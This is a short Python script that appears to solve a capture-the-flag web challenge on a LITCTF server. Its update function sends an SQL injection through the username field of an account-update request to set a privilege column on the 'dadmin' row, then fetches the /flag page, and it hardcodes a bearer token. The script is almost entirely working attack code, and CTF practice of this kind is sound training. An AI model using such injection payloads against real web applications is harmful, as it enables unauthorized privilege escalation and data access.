import requests 

url = 'http://litctf.org:31783/'

token = "XUTEJX4OMN7PGC9JOQWH33WRASGF9ZO5A1Q6M4V7"

point = '/login'

headers = { 
    'Authorization': f'Bearer {token}'
}
#resp = requests.post(url + point, headers=headers, data={'username': 'dadmin', 'password': 'admin0'})
#print(resp.text)
def update():
    username_injection = 'dadmin", sus=1 WHERE username="dadmin"; -- '
    resp = requests.post(url + '/account/update', headers=headers, data={'username': username_injection, 'password': 'admin0'})
    print(resp.text)

def flag():
    resp = requests.get(url + '/flag', headers=headers)
    print(resp.text)

#update()

flag()